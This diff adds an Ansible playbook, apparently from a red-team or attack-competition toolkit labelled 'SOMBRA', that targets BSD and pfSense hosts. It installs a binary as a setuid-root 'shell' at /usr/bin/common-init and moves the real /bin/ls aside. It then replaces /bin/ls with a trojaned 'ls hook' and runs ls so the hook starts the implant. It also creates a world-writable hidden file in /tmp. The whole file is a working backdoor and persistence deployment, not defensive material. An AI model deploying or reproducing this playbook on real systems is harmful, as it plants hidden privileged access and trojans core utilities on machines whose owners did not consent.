@@ -1,0 +1,45 @@
+- name: Check if I already copied over the ls hook
+  stat:
+    path: /usr/bin/list
+  register: list
+
+######################################################################
+#
+# BSD Boxes
+#
+######################################################################
+- name: oops
+  shell: "killall -9 /usr/bin/common-init"
+  failed_when: False
+
+- name: SOMBRA | Touch | Unux
+  file:
+    path: '/tmp/.runtime'
+    mode: '0777'
+    state: touch
+
+- name: SOMBRA | Install shell | BSD
+  copy:
+    src: sombra-bsd
+    dest: /usr/bin/common-init
+    mode: '4755'
+
+- name: SOMBRA | Move ls | BSD
+  copy:
+    remote_src: yes
+    src: /bin/ls
+    dest: /usr/bin/list
+    mode: '755'
+  when: not list.stat.exists
+
+- name: SOMBRA | Copy ls hook | pfSense
+  copy:
+    src: ls-bsd
+    dest: /bin/ls
+    mode: '755'
+  when: not list.stat.exists
+
+- name: SOMBRA | Init Shell | pfSense
+  shell: "/bin/ls /"
+  args:
+    executable: "/bin/sh"
